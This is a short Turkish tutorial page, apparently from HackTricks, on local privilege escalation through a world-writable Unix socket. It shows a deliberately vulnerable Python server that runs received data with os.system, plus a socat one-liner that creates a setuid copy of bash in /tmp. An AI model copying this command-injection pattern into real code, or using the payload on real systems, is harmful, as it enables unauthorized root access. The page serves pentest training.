{{#include ../../banners/hacktricks-training.md}}

## Python ile Socket Bağlama Örneği

Aşağıdaki örnekte bir **unix socket oluşturuluyor** (`/tmp/socket_test.s`) ve **alınan her şey** `os.system` tarafından **çalıştırılacak**. Bunun doğada bulunmayacağını biliyorum, ancak bu örneğin amacı, unix socket'leri kullanan bir kodun nasıl göründüğünü ve en kötü durumda girişi nasıl yöneteceğimizi görmektir.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Kodu** python ile çalıştırın: `python s.py` ve **socket'in nasıl dinlediğini kontrol edin**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Sömürü**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
